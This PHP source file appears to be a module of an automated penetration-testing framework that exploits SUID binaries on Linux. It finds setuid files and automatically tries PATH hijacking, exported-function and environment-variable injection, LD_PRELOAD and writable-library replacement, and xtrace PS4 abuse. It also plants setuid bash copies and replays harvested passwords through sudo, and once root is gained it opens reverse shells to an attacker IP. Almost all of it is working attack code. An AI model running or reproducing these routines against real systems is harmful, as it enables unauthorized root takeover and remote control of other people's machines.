<?php


class check4linux8suid extends check4linux8exploits{
    var $socat_path ;
    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
    }
    
    /*
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
 
  int main(void)
{
 
    uid_t uid, euid;
    uid = getuid();
    euid = geteuid();
    setreuid(euid, euid);
    system("/bin/bash");
 
    return 0;
 
}
     */
    
    
    public function suids8env($suid_path){
        $this->titre(__FUNCTION__);
        if (!$this->ip2root8db($this->ip2id))  $this->suids8env2path($suid_path);
        if (!$this->ip2root8db($this->ip2id))  $this->suids8env2ld_preload($suid_path);
    }
    
    
    public function suids(){
        // https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
        // https://book.hacktricks.xyz/linux-unix/privilege-escalation
        
        $this->titre(__FUNCTION__);
        $tmp = array();
        $lines = "";
        $this->note("exec root file");
        $data = "find / -perm -o=wx -uid 0 -type f -maxdepth 5 -exec ls -al {} \; 2> /dev/null  ";
        $lines .= $this->lan2stream4result($data,$this->stream_timeout*3);
        $this->pause();
        $this->note("exec group root file");
        $data = "find / -perm -o=wx -gid 0 -type f -maxdepth 5 -exec ls -al {} \; 2> /dev/null  ";
        $lines .= $this->lan2stream4result($data,$this->stream_timeout*3);
        $this->pause();
        $this->note("Sticky Bits");
        $data = "find / -perm -u=s -type f -maxdepth 5 -exec ls -al {} \; 2> /dev/null";
        $lines .= $this->lan2stream4result($data,$this->stream_timeout*3);
        $this->pause();

        $this->article("Find files/ folder owned by the user","After compromising the machine with an unprivileged shell,
/home would contains the users present on the system. Also, viewable by checking /etc/passwd.
Many times, we do want to see if there are any files owned by those users outside their home directory.");
        
        $query = "echo '".base64_encode($lines)."' | base64 -d $this->filter_file_path  | grep -v \":\" ";
        $this->requette($query);
        exec($query,$tmp);
        
        $tab_suid = array_filter(array_unique($tmp));
        if (!empty($tab_suid)) sort($tab_suid);
        unset($tmp);
        $this->pause();
        
        //$tab_suid = array("/usr/local/bin/whoisme");
        //$tab_suid = array("/usr/bin/bwrap");
        
        $this->suids4all($tab_suid);
        

        
    }
    

    
    
    public function suids4one($suid){
        $this->titre(__FUNCTION__);
        if (!empty($suid)){            
            $data = "chmod 777 $suid";
            $this->lan2stream4result($data,$this->stream_timeout);
            $this->pause();                       
            if (!$this->ip2root8db($this->ip2id)) $this->lan2file2backdoor($suid);
            if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($suid,FALSE,"");
            if (!$this->ip2root8db($this->ip2id))  $this->suids8env($suid);
            if (!$this->ip2root8db($this->ip2id))  $this->suids8app($suid);           
            //if (!$this->ip2root8db($this->ip2id)) $this->suids8bof($suid);     
        }
    }
    
    
    public function suids4all($tab_suid){
        $this->titre(__FUNCTION__);
        $this->article("SUID", "\n".$this->tab($tab_suid));
        
        //$tab_suid = array("/home/user5/script","/home/user3/shell","/home/user3/.script.sh");
        //$tab_suid = array("/home/user5/script");
        
        
        $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        $this->pause();
        
        $size = count($tab_suid);        
        for($i=0;$i<$size;$i++){
            $this->article("$i/$size Test on Suid", $tab_suid[$i]);
            if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($tab_suid[$i],FALSE,"");
            $this->pause();
        }
        
    
        
        $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        $this->pause();
        
        $size = count($tab_suid);
        for($i=0;$i<$size;$i++){
            $this->article("$i/$size Test on Suid", $tab_suid[$i]);
            if (!$this->ip2root8db($this->ip2id)) $this->suids8env($tab_suid[$i]);
            $this->pause();
        }
        
        $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        $this->pause();
        
        
        
        $size = count($tab_suid);
        for($i=0;$i<$size;$i++){
            $this->article("$i/$size Test on Suid", $tab_suid[$i]);
            if (!$this->ip2root8db($this->ip2id)) $this->suids8app($tab_suid[$i]);
            $this->pause();
        }
        
        $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        $this->pause();
        
        
        $size = count($tab_suid);
        for($i=0;$i<$size;$i++){
            $this->article("$i/$size Test on Suid", $tab_suid[$i]);
            //if (!$this->ip2root8db($this->ip2id)) $this->suids8bof($tab_suid[$i]);
            $this->pause();
        }
        
        $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        $this->pause();


    }
    
    
    
    
    public function suids8env2path2var($suid_path){ // OK //billu box 2
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $shell = "/bin/sh";
        $this->article("Environment Variable Abuse","If the suid binary contains a code like
	    asprintf(&buffer, \"/bin/echo %s is cool\", getenv(\"USER\"));
	    printf(\"about to call system(\\\"%s\\\")\n\", buffer);
	    system(buffer);
	    We can see that it is accepting environment variable USER which can be user-controlled.
        In that case just define USER variable to
	    USER=\";$shell;\"
	    When the program is executed, USER variable will contain $shell and will be executed on system call.
	    echo \$USER
	    ;$shell;
	    levelXX@:/home/flagXX$ ./flagXX
	    about to call system(\"/bin/echo ;$shell; is cool\")
	    sh-4.2$ id
	    uid=997(flagXX) gid=1003(levelXX) groups=997(flagXX),1003(levelXX)" );
        
        $env_var = "getenv\(\"[A-Z0-9]{1,}\"\)";
        $data = "strings $suid_path | grep \"getenv\(\" | grep -Po '$env_var' ";
        $check_env_var_req = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo '$check_env_var_req' | grep -Po '$env_var'  ";
        $check_env_var = trim($this->req_ret_str($data));
        
        if (!empty($check_env_var)) $this->suids8env2path4var($check_env_var,$suid_path);
        
        return $result;
    }
    
    public function suids8env2path4var($var,$suid_path){ // OK //billu box 2
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $shell = "/bin/sh";

        
        $cmd = "/usr/bin/id";
        $data = "export $var=\"$cmd\" ; $suid_path ";        // OK
        if( $this->lan2root4check8id($data,__FUNCTION__.": $data")){
            $attacker_ip = $this->ip4addr4target($this->ip);
            $attacker_port = rand(1024,65535);
            $shell = "/bin/bash";
            $cmd = $this->rev8sh($attacker_ip, $attacker_port, $shell);
            $data = "export $var=\"$cmd\" ; $suid_path ";
            $lines = $this->lan2pentest($attacker_port,"T",__FUNCTION__.": $data",$data,500);
            $result .= $lines;
            
        }
        return $result;
    }
  

    
    
    
    public function suids8app($suid){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $tmp = array();
        $username = "";
        $userpass = "";
        $sudo = FALSE;
        $filepath = trim($suid);
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        //$attacker_port = 9999;
        $shell = "/bin/bash";
        $timeout =  3600 ;
        
        
        
        $this->lan2file4writable($filepath);
        

        $data = "strings $suid ";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);

        
        exec("echo '".base64_encode($lines)."' | base64 -d | grep -Po \"^(/[a-z0-9\-\_]{1,}(/[a-z0-9\-\_\.]{1,})+)\" | sort -u ",$tmp);
        if(!empty($tmp)){
            $exec_filepath = $tmp;
            $this->article("Found Path into $suid", $this->tab($exec_filepath));
            foreach ($exec_filepath as $exec_path){
                $exec_path = trim($exec_path);
                if(!empty($exec_path)){
                    echo "\n====START FILE=======================================================\n";
                    $obj_file = new FILE($exec_path);
                    $data = "chmod 777 $obj_file->file_path";
                    $this->lan2stream4result($data,$this->stream_timeout);
                    
                    $data = "ls -al $obj_file->file_path 2> /dev/null";
                    $this->lan2stream4result($data,$this->stream_timeout);
                    $data = "file $obj_file->file_path 2> /dev/null";
                    $this->lan2stream4result($data,$this->stream_timeout);
                    $data = "stat $obj_file->file_path 2> /dev/null";
                    $this->lan2stream4result($data,$this->stream_timeout);

                    $this->article("Ext", $obj_file->file_ext);
                    switch ($obj_file->file_ext) {
                        
                        case "" :
                    $data = "strace -s 999 -v -f $obj_file->file_path | grep -E \"(open|access)\" ";
                    $result .= $this->lan2stream4result($data,$this->stream_timeout);
                    $data = "ltrace $obj_file->file_path";
                    $this->lan2stream4result($data,$this->stream_timeout);                    
                    $this->suids8env2path4function($suid, $exec_path);
                    break;
                    
                        case ".so" :
                            $this->suids8app2lib($obj_file->file_path,$suid);
                                       
                            break;
                    }
                    echo "====END FILE=======================================================\n\n";
                }
            }
            //$this->pause();
        }
        return $result;
        

    }
    
    
    public function suids4elf($suid){
        $suid_call = $this->lan2bin4syscall($suid);
        //$suid_call = "whoami";
        $this->article("calling ",$suid_call);
        if(!empty($suid_call)){
            if(strstr($suid_call, "/")!==FALSE) {if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path4function($suid, $suid_call);$this->pause();}
            else {
                if (!$this->ip2root8db($this->ip2id)) {$this->suids8env2path4add($suid,$suid_call); $this->pause();}
            }
        }
    }
    
    public function suids8env2path($suid){
        $this->titre(__FUNCTION__);

        // https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

        if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2xtrace($suid);$this->pause(); // OK 
        if (!$this->ip2root8db($this->ip2id)) $this->suids4elf($suid);$this->pause(); // OK
        if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2var($suid);$this->pause();
    }
    
    
    public function suids8env2path4add($suid,$suid_call){ // OK //billu box 2

        $this->ssTitre(__FUNCTION__);
        
        if (!empty($suid_call)){
        $data = "echo \"/usr/bin/id\" > $this->vm_tmp_lin/$suid_call ; chmod 755 $this->vm_tmp_lin/$suid_call ; export PATH=\"$this->vm_tmp_lin:\$PATH\" ; $suid ";
        //$this->lan2stream4result($data,$this->stream_timeout);
        
        $template_id_euid = "echo \"%ID%\" > $this->vm_tmp_lin/$suid_call ; chmod 755 $this->vm_tmp_lin/$suid_call ; export PATH=\"$this->vm_tmp_lin:\$PATH\" ; $suid ";        // OK
        $templateB64_cmd = base64_encode(str_replace("%ID%","%CMD%", $template_id_euid));

        if( $this->lan2root4check8id($data,$templateB64_cmd)){
            $attacker_ip = $this->ip4addr4target($this->ip);
            $attacker_port = rand(1024,65535);
            $attacker_port = 6666;
            $shell = "/bin/sh";
            $cmd = addslashes($this->rev8fifo($attacker_ip, $attacker_port, $shell));
            $data = "echo \"$cmd\" > $this->vm_tmp_lin/$suid_call ; chmod 755 $this->vm_tmp_lin/$suid_call ; export PATH=\"$this->vm_tmp_lin:\$PATH\" ; $suid ";
            $this->lan2pentest($attacker_port,"T",$templateB64_cmd,$this->templateB64_shell,$data,500);

        }
        }
    }
    
    public function suids8env2ld_preload($suid_path){
        
        $result = "";
        $result .= $this->titre(__FUNCTION__);

        
        $ld_preload_env = "LD_PRELOAD";
        $data = "printenv | grep -v \"LS_COLOR\" | strings | grep \"$ld_preload_env\" ";
        $check_ld_preload_req = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo \"$check_ld_preload_req\" | grep -Po \"$ld_preload_env\"  ";
        $check_ld_preload = $this->req_ret_str($data);
        if(!empty($check_ld_preload)){
        $data = "gdb -q --batch -ex \"info functions\" $suid_path | grep -v \"@\"";
        $functions_internes = $this->lan2stream4result($data,$this->stream_timeout);
        $data = "echo '$functions_internes' | grep -v '@'  ";
        $functions_internes_tab = $this->req_ret_tab($data);
        foreach ($functions_internes_tab as $functions_internes_name)
        {
            if(!empty($functions_internes_name)){
                $functions_internes_name = trim($functions_internes_name);
                $lib_suid = <<<EOC
        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        int main(void){
        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);
        $functions_internes_name();
        
        }
        void $functions_internes_name(){
        execvp("/bin/sh", NULL, NULL);
    
        }
EOC;
                // execl("/bin/sh","sh",(char*)0);
                
                $data = "echo '$lib_suid' > $this->vm_tmp_lin/libsuid.c ";
                $lines = $this->lan2stream4result($data,$this->stream_timeout);
                $result .= $lines;
                $this->pause();
                
                $data = "gcc -m32 -shared -o $this->vm_tmp_lin/libsuid.so $this->vm_tmp_lin/libsuid.c ";
                $lines = $this->lan2stream4result($data,$this->stream_timeout);
                $result .= $lines;
                $this->pause();
                
                $data = "chmod u+s $this->vm_tmp_lin/libsuid ";
                $lines = $this->lan2stream4result($data,$this->stream_timeout);
                $result .= $lines;
                $data = "ls -al $this->vm_tmp_lin/libsuid ";
                $lines = $this->lan2stream4result($data,$this->stream_timeout);
                $result .= $lines;
                $this->pause();
                
                $data = "chmod 4755 $this->vm_tmp_lin/libsuid ";
                $lines = $this->lan2stream4result($data,$this->stream_timeout);
                $result .= $lines;
                $data = "ls -al $this->vm_tmp_lin/libsuid ";
                $lines = $this->lan2stream4result($data,$this->stream_timeout);
                $result .= $lines;
                $this->pause();
                
                $data = "export LD_PRELOAD=$this->vm_tmp_lin/libsuid ; $suid_path id"; 
                if( $this->lan2root4check8id($data,__FUNCTION__.": $data")){
                    $attacker_ip = $this->ip4addr4target($this->ip);
                    $attacker_port = rand(1024,65535);
                    $shell = "/bin/sh";
                    $cmd = $this->rev8sh($attacker_ip, $attacker_port, $shell);
                    $data = "export LD_PRELOAD=$this->vm_tmp_lin/libsuid ; $suid_path $cmd";
                    $lines = $this->lan2pentest($attacker_port,"T",__FUNCTION__.": $data",$data,500);
                    $result .= $lines;
                    
                }
                $this->pause();
                
                
            }
        }
        }
        
        return $result;
    }
    public function suids8app2lib($lib,$suid){ // OK //billu box 2
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $obj_file = new FILE($lib);

        if ($this->lan2file4exist($obj_file->file_path)===FALSE) {
            if ($this->lan2file4exist($obj_file->file_dir)===FALSE){
                $this->article("Creat Dir", $obj_file->file_dir);
                $data = "mkdir $obj_file->file_dir";
                $this->lan2stream4result($data,$this->stream_timeout);
                $data = "cd ..$obj_file->file_dir; chmod +rx .";
                $this->lan2stream4result($data,$this->stream_timeout);
                $this->pause();
                
            }
            $data = "echo '' > $obj_file->file_path";
            $this->lan2stream4result($data,$this->stream_timeout);
            $data = "chmod 777 $obj_file->file_path";
            $this->lan2stream4result($data,$this->stream_timeout);
        }
        
        if( ($this->lan2file4writable($obj_file->file_path)) && ($this->lan2file4exist($obj_file->file_path)===TRUE) ){
            
            
            
            $cmd_lib = "cp /bin/bash /tmp/bash && chmod 6777 /tmp/bash && /tmp/bash -p -c /usr/bin/id";
            $cmd_lib = "/bin/bash -p -c /usr/bin/id";
            $lib_bash = $this->c2so($cmd_lib);
            
            
            $data = "echo '$lib_bash' > $this->vm_tmp_lin/$obj_file->file_name.c ";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "ls -al $obj_file->file_path ";
            $this->lan2stream4result($data,$this->stream_timeout);
            $data = "gcc -fPIC -c $this->vm_tmp_lin/$obj_file->file_name.c ";
            //$this->lan2stream4result($data,$this->stream_timeout);
            $data = "ld -shared -o $obj_file->file_path $this->vm_tmp_lin/$obj_file->file_name.o ";
            //$this->lan2stream4result($data,$this->stream_timeout);
            $data = "gcc -shared -o $obj_file->file_path -fPIC $this->vm_tmp_lin/$obj_file->file_name.c ";
            $this->lan2stream4result($data,$this->stream_timeout);
            $data = "chmod +s $obj_file->file_path ";
            $lines = $this->lan2stream4result($data,$this->stream_timeout);
            $data = "chmod 777 $obj_file->file_path";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $users4passwd = $this->ip2users4passwd();
            $users4shell = $this->ip2users4shell();
            $this->ssTitre("User and Password");
            foreach ($users4passwd as $username => $userpass){
                $data_check = "echo '$userpass' | sudo -S -u $username $suid ";
                $rst = $this->lan2stream4result($data_check,$this->stream_timeout);
               list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                // var_dump($username_found);
                //$this->pause();
                
                if ( !empty($username_found) ){
                    
                    $this->article("username found", $username_found);
                    $username_now = $this->lan2whoami();
                    $this->article("username now", $username_now);
                    //$this->pause();
                    if ($username_now !== $username_found){
                        $attacker_ip = $this->ip4addr4target($this->ip);
                        $attacker_port = rand(1024,65535);
                        $shell = "/bin/sh";
                        $cmd_lib = "id";
                        //$cmd_lib = $this->rev8sh($attacker_ip, $attacker_port, $shell);
                        $lib_bash = $this->c2so($cmd_lib);
                        
                        
                        $data = "echo '$lib_bash' > $this->vm_tmp_lin/$obj_file->file_name.c ";
                        $this->lan2stream4result($data,$this->stream_timeout);
                        
                        $data = "ls -al $obj_file->file_path ";
                        $this->lan2stream4result($data,$this->stream_timeout);
                        $data = "gcc -fPIC -c $this->vm_tmp_lin/$obj_file->file_name.c ";
                        //$this->lan2stream4result($data,$this->stream_timeout);
                        $data = "ld -shared -o $obj_file->file_path $this->vm_tmp_lin/$obj_file->file_name.o ";
                        //$this->lan2stream4result($data,$this->stream_timeout);
                        $data = "gcc -shared -o $obj_file->file_path -fPIC $this->vm_tmp_lin/$obj_file->file_name.c ";
                        $this->lan2stream4result($data,$this->stream_timeout);
                        $data = "chmod +s $obj_file->file_path ";
                        $lines = $this->lan2stream4result($data,$this->stream_timeout);
                        $data = "chmod 777 $obj_file->file_path";
                        $this->lan2stream4result($data,$this->stream_timeout);
                        
                        $data_check = "echo '$userpass' | sudo -S -u $username $suid";
                        $this->lan2stream4result($data_check,$this->stream_timeout);
                        
                        
                        $template_id_test = "/tmp/bash_$username_now"."_$username_found -p -c %ID%";
                        
                        $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);
                    }
                }
                
     
                
                $this->ssTitre("ALL User shell");
                //var_dump($users4shell);$this->pause();
                foreach ($users4shell as $user_shell){
                    if (!empty($user_shell)){
                        $data_check = "echo '$userpass' | sudo -S -u $user_shell $suid";
                        $rst = $this->lan2stream4result($data_check,$this->stream_timeout);
                        list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                        // var_dump($username_found);
                        //$this->pause();
                        
                        if ( !empty($username_found) ){                      
                            $this->article("username found", $username_found);
                            $username_now = $this->lan2whoami();
                            $this->article("username now", $username_now);
                            //$this->pause();
                            if ($username_now!==$username_found){
                                $attacker_ip = $this->ip4addr4target($this->ip);
                                $attacker_port = rand(1024,65535);

                                $shell = "/bin/bash";
                                
                                $cmd_lib = "cp /bin/bash /tmp/bash_$username_now"."_$username_found && chmod 6777 /tmp/bash_$username_now"."_$username_found";
                                $lib_bash = $this->c2so($cmd_lib);
                                $template_suid = $lib_bash;
                                //$template_suid = $this->c2so("/bin/bash -p -i -C %ID% ");
                                
                                $data = "echo '$lib_bash' > $this->vm_tmp_lin/$obj_file->file_name.c ";
                                $template_suid = "echo '$template_suid' > $this->vm_tmp_lin/$obj_file->file_name.c ";
                                $this->lan2stream4result($data,$this->stream_timeout);
                                
                                $data = "ls -al $obj_file->file_path ";
                                $this->lan2stream4result($data,$this->stream_timeout);
                                $data = "gcc -fPIC -c $this->vm_tmp_lin/$obj_file->file_name.c ";
                                //$this->lan2stream4result($data,$this->stream_timeout);
                                $data = "ld -shared -o $obj_file->file_path $this->vm_tmp_lin/$obj_file->file_name.o ";
                                //$this->lan2stream4result($data,$this->stream_timeout);
                                
                                $data = "gcc -shared -o $obj_file->file_path -fPIC $this->vm_tmp_lin/$obj_file->file_name.c ";
                                $template_suid .= "; $data";
                                $this->lan2stream4result($data,$this->stream_timeout);
                                
                                $data = "chmod +s $obj_file->file_path ";
                                $template_suid .= "; $data";
                                $lines = $this->lan2stream4result($data,$this->stream_timeout);
                                
                                $data = "chmod 777 $obj_file->file_path";
                                $this->lan2stream4result($data,$this->stream_timeout);
                                $template_suid .= "; $data_check";

                                $data_check = "echo '$userpass' | sudo -S -u $user_shell $suid";
                                $this->lan2stream4result($data_check,$this->stream_timeout);

                                
                                $template_id_test = "/tmp/bash_$username_now"."_$username_found -p -c %ID%";
                                
                                
                                
                                $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);

                               }
                                
 
                            }
                        }
                        

                    }
                }
            }

    }
    
    
    
    
    
    public function suids8bof($suid_path){ // OK 
        $this->titre(__FUNCTION__);
        $obj_suid = new FILE($suid_path);
        $data = "ls -al $suid_path";
        $this->lan2stream4result($data, $this->stream_timeout);

        $data = "cp -v $suid_path /var/www/html/";
        $this->lan2stream4result($data, $this->stream_timeout);
        
        $data = "ls -al /var/www/html/";
        $this->lan2stream4result($data, $this->stream_timeout);
        
        $bin_bof = "$this->dir_tmp/$obj_suid->file_name";
        $obj_bin = new exploit4linux($bin_bof);
        $obj_bin->exploit4linux2check();
        
        
    }
    

    

    
    
    public function suids8env2path4function($suid,$filepath_call){ // OK //billu box 2
        $this->ssTitre(__FUNCTION__);
        $data = "function $filepath_call () { /usr/bin/id; } ; export -f $filepath_call; $suid ";        // OK
        if( $this->lan2root4check8id($data,__FUNCTION__.": $data")){
            $attacker_ip = $this->ip4addr4target($this->ip);
            $attacker_port = rand(1024,65535);
            $shell = "/bin/sh";
            $cmd = $this->rev8sh($attacker_ip, $attacker_port, $shell);
            
            $data = "function $filepath_call () { $cmd; } ; export -f $filepath_call; $suid  ";
            $this->lan2pentest($attacker_port,"T",base64_encode($data),$data,500);

            
        }
    }
    

    
    public function suids8env2path2xtrace($suid){ // 
        $this->ssTitre(__FUNCTION__);
        
        $hash_suid = sha1($suid);
        $data = "env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/$hash_suid && chown root.root /tmp/$hash_suid && chmod +s /tmp/$hash_suid && /tmp/$hash_suid -p -c id)' /bin/sh -c  '$suid'";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "/tmp/$hash_suid -p -c id";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $template_id_euid = "/tmp/$hash_suid -p -c %ID% ";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        $shell = "/bin/sh";
        $this->lan2pentest8id($template_id_euid,$attacker_ip,$attacker_port,$shell);
    }
    
    
    
    
}
?>
